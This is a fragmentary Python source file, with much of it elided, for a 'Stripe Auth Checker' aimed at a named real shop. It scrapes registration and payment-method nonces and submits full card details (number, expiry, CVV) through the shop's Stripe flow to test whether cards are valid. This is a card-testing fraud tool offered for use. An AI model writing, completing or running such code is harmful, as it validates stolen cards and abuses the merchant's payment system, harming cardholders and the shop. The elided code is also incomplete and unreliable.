"""
Fast Nomade Studio Stripe Auth Checker
=======================================
High-speed implementation for shop.nomade-studio.be
...
class NomadeStripeChecker:
    """
    Fast Nomade Studio Stripe Checker with optimized workflow.
    """
    
    def __init__(self):
        self.site_url = NOMADE_SITE.rstrip('/')
        ...
        try:
            async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
                ...
                for inp in reg_form.find_all('input'):
                    ...
                    if name and 'nonce' in name.lower():
                        nonce = value
                ...
                # Step 5: Get add-payment-method/ page and extract nonce (FAST)
                ...
                # Parse HTML for nonce extraction (FAST)
                ...
                pm_data = {
                    ...
                    "billing_details[address][country]": "BE",
...
async def check_nomade_stripe(fullcc: str) -> Dict:
    """
    Fast check a card using Nomade Studio Stripe Auth.
    ...
    checker = NomadeStripeChecker()
    return await checker.check_card(card, month, year, cvv)


def determine_nomade_status(result: Dict) -> str:
    """
